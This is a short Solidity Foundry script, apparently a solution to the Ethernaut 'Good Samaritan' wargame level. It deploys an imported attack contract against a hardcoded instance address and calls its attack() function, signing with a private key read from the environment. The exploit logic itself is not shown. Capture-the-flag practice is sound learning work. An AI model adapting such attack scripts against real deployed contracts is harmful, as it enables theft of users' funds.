// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import {ThanksForTheNotif} from "../src/27_GoodSamaritan.sol";

interface IGoolSamaritan {
    function setDetectionBot(address _bot) external;
}

contract PoC is Script {
    address goodOldSama = 0x19bd36accED359007B00Baf460Eb07045c3396BD; // Replace with your GoodSamaritan instance

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        ThanksForTheNotif thanksForTheNotif = new ThanksForTheNotif(
            goodOldSama
        );

        thanksForTheNotif.attack();

        vm.stopBroadcast();
    }
}
